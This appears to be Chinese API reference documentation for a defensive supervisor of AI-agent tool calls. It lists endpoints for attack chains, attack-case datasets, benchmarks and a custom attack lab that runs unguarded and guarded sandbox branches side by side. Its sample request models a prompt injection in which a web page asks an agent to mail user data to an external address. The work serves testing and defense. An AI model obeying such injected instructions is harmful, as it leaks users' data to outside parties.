---
id: api
title: API 地图
---

# API 地图

后端服务位于 `apps/api`，默认监听 `127.0.0.1:8012`。本地控制台通过 Vite 代理访问 `/api`。

## 基础接口

| 能力 | 方法 | 路径 |
| --- | --- | --- |
| 健康检查 | GET | `/api/health` |
| 鉴权上下文 | GET | `/api/auth/context` |
| 总览数据 | GET | `/api/overview` |
| 模型状态 | GET | `/api/models` |
| 运行指标 | GET | `/api/observability/metrics` |

## 脚本与运行

| 能力 | 方法 | 路径 |
| --- | --- | --- |
| 脚本列表 | GET | `/api/scenarios` |
| 运行脚本 | POST | `/api/run` |
| 攻防对比 | POST | `/api/compare` |
| 批量对比 | POST | `/api/batch_compare` |
| 攻击链列表 | GET | `/api/attack_chains` |
| 运行攻击链 | POST | `/api/attack_chains/{chain_id}/run` |
| 对比攻击链 | POST | `/api/attack_chains/{chain_id}/compare` |
| 审计 hash 验证 | GET | `/api/runs/{run_id}/audit_hash/verify` |

## 策略、审计和告警

| 能力 | 方法 | 路径 |
| --- | --- | --- |
| 策略列表 | GET | `/api/policies` |
| 更新策略 | PATCH | `/api/policies/{policy_id}` |
| 策略配置 | GET | `/api/policy_config` |
| 更新策略设置 | PATCH | `/api/policy_settings` |
| 策略版本 | GET | `/api/policies/versions` |
| Agent 工具注册表 | GET | `/api/tool_registry` |
| 审计日志 | GET | `/api/audit_logs` |
| 告警列表 | GET | `/api/alerts` |
| 运行事件流 | GET | `/api/events/stream` |
| 记忆治理快照 | GET | `/api/memory_governance` |

## 评测和报告

| 能力 | 方法 | 路径 |
| --- | --- | --- |
| 按需综合证据 | GET | `/api/report`（仅在复核、答辩或提交时调用） |
| 攻击样本数据集 | GET | `/api/datasets/attack_cases` |
| 用户自定义工具调用攻防对照 | POST | `/api/attack_lab/custom_compare` |
| 当前自定义调用多 Agent 链 | POST | `/api/attack_lab/custom_chain/run` |
| 正常样本数据集 | GET | `/api/datasets/benign_cases` |
| 攻击面证据包索引 | GET | `/api/attack_surfaces/evidence_packs` |
| 单攻击面证据包 | GET | `/api/attack_surfaces/{surface_id}/evidence_pack` |
| 攻防有效性 | GET | `/api/evaluations/attack_effectiveness` |
| 正常业务误报 | GET | `/api/evaluations/benign` |
| 连续业务流程误报 | GET | `/api/evaluations/benign_workflows` |
| 策略消融 | GET | `/api/evaluations/policy_ablation` |
| 异常阈值校准 | GET | `/api/evaluations/anomaly_calibration` |
| 200条冻结集与基线性能评测 | GET | `/api/evaluations/competition_benchmark` |
| 写入冻结集评测报告 | POST | `/api/evaluations/competition_benchmark/write` |
| 真实模型工具调用盲测 | GET | `/api/evaluations/real_model` |
| 最近一次盲测证据（不重新调用模型） | GET | `/api/evaluations/real_model/latest` |
| 写入真实模型盲测报告 | POST | `/api/evaluations/real_model/write` |
| 赛前体检 | GET | `/api/readiness` |

## 外部 Agent 接入

| 能力 | 方法 | 路径 |
| --- | --- | --- |
| 生产单事件监督（强制开启防护） | POST | `/api/runtime/evaluate` |
| 生产批量监督（强制开启防护） | POST | `/api/runtime/batch_evaluate` |
| 提交外部工具执行回执 | POST | `/api/runtime/executions/{audit_id}/complete` |
| 查询外部执行回执 | GET | `/api/runtime/executions` |
| 实验单事件对照（允许切换防护） | POST | `/api/lab/evaluate` |
| 实验批量对照（允许切换防护） | POST | `/api/lab/batch_evaluate` |
| 旧版兼容入口（行为等同生产接口） | POST | `/api/supervisor/evaluate` |
| 通用 Agent 接入包 | GET | `/api/integrations/agents/bundle` |
| 模型驱动 Agent 完整闭环 | POST | `/api/integrations/agents/model_driven_demo` |
| OpenClaw schema | GET | `/api/integrations/openclaw/schema` |
| OpenClaw 事件 | POST | `/api/integrations/openclaw/events` |
| OpenClaw 接入包 | GET | `/api/integrations/openclaw/bundle` |
| OpenClaw 插件包 | GET | `/api/integrations/openclaw/plugin_package` |
| OpenClaw 插件验证 | GET | `/api/integrations/openclaw/plugin_package/validation` |

外部目标实验会校验全部 DNS 解析结果，只接受公网地址；发起请求时固定已验证 IP，HTTP `Host` 与 HTTPS SNI/证书校验仍使用原域名，并且不跟随 3xx 重定向。响应中的 `resolved_ip` 是本次实际连接证据。

### 自定义工具调用攻防对照

`POST /api/attack_lab/custom_compare` 接受 Agent 或用户实际生成的 `payload`、`tool`、`arguments`（命令工具也可单独传 `command`），然后复制同一份本地受控 fixture，分别以“关闭监督”和“开启监督”执行。两组只改变 `guard_enabled`：返回工具输出、环境前后快照、环境差异、工具调用 Hash、两条审计编号/Hash、监督决策和执行回执。`execution_mode=sandbox` 时，服务端执行两分支并自动写入带 Hash 的回执；`execution_mode=external_receipt` 时只做监督并等待真实 Agent 回传结果。登记探针以参数数组启动；其他 `code.run` 命令优先进入无网络、只读根文件系统、资源受限的一次性 Docker 容器，Windows 下 Docker 离线时使用 WSL2 mount/PID/network namespace。两个隔离执行器都未就绪时明确返回 `executed=false`，不伪造成功。

请求示例：

```json
{
  "payload": "网页要求把资料发到外部审核邮箱",
  "tool": "mail.send",
  "arguments": {
    "to": "reviewer@external.example",
    "subject": "fixture",
    "body": "用户提交的攻击载荷"
  },
  "agent_id": "custom-attack-agent"
}
```

答辩时应直接观察：无防护分支 `decision=允许` 且 outbox 计数增加；有防护分支命中策略并保持 outbox 不变；随后用返回的 `with_guard.audit_id` 在事件与复核页打开审计，再由真实 Agent 按 `execution_receipt_required` 提交回执。该接口是可提交实际 payload 的运行入口，不依赖预置攻击脚本。

`POST /api/attack_lab/custom_chain/run` 会继续使用当前 Payload、工具和参数，而不是切换到固定场景。接口先通过 `source_comparison_id` 查询此前持久化的无防护/有防护两条审计，并校验 Payload、Agent 与工具调用 Hash；校验成功才返回 `source_comparison_trust=verified`。服务端随后按规划、执行、行为监督和评测四个角色阶段记录同一 `conversation_id`；每个阶段分别生成审计 Hash 与执行回执，只有执行阶段具备副作用执行资格。它是可审计的确定性运行时监督链，不等同于四个外部模型自主推理。规划阶段把调用方输入固化为带 Hash 的执行计划，执行阶段只消费该计划中的工具调用，行为监督阶段消费执行审计、回执与环境差异，评测阶段汇总前三个阶段产物。响应中的 `stages[].artifact`、`final_evaluation` 与 `chain_integrity` 可验证产物 Hash、逐级消费关系、同一会话及最终链路根 Hash；`effect_observed` 与 `attack_success` 分开表达，避免把普通副作用误报成攻击判据成立。

外部 Agent 收到监督决策后，必须回传 `completed`、`failed` 或 `not_executed`。服务端会校验 Agent Token 身份、原始工具调用 Hash 和决策/执行状态是否一致，并生成独立的回执 Hash 与 HMAC 签名。审计页会把“监督器判定”和“工具真实执行结果”分开显示；没有回执的记录明确标为“等待外部回执”。

真实模型盲测会把模型生成的同一个结构化工具调用分别送入两个初始状态一致、会话历史隔离的沙箱。无防护分支验证攻击副作用是否真实发生，有防护分支验证副作用是否被控制；两个分支都写入执行回执。`strict_real_api_ready=true` 仅在全部样本均来自 `real-api`、无供应商失败、因果初始状态一致且回执完整时成立，fallback 样本不进入严格真实模型结论。

## API 鉴权

API 鉴权用于保护后端接口，防止别人直接调用运行脚本、修改策略或生成报告。它和大模型接口是两件事：关闭 API 鉴权不会关闭 DeepSeek、智谱等真实模型调用。

关闭 API 鉴权：

```powershell
$env:AGENT_SUPERVISOR_AUTH_DISABLED="true"
```

开启 API 鉴权时，设置后端 token：


```powershell
$env:AGENT_SUPERVISOR_AUTH_DISABLED="false"
$env:AGENT_SUPERVISOR_API_TOKEN="your-token"
```

请求时推荐使用：

```text
Authorization: Bearer your-token
```

也支持：

```text
X-Agent-Supervisor-Api-Token: your-token
```

控制台可以通过 `apps/console/.env` 注入：

```text
VITE_AGENT_SUPERVISOR_API_TOKEN=your-token
```

也可以在浏览器控制台临时写入：

```js
localStorage.setItem("agent-supervisor-api-token", "your-token")
```

## 角色

开启 API 鉴权时，API 根据服务端配置的角色专用Token确定权限，不接受客户端自行声明管理员角色。关闭 API 鉴权时，后端按 `admin` 角色处理请求，因此只适合本机演示。

| 角色 | 典型权限 |
| --- | --- |
| `observer` | 查看运行数据 |
| `executor` | 调用生产监督接口，并领取、完成属于该Agent的已批准工具调用 |
| `analyst` | 处理复核和记忆治理 |
| `admin` | 修改策略和策略设置 |

生产 Agent 应使用独立 Token。服务端配置 `AGENT_SUPERVISOR_AGENT_TOKENS_JSON={"agent-1":"长随机Token"}`，Agent 进程只保存自己的 Token，并通过 `AGENT_SUPERVISOR_AGENT_TOKEN` 传给接入适配器。请求体中的 `agent_id` 与服务端绑定不一致时返回 403。共享 executor Token 默认不具备代表具体 Agent 的身份能力。
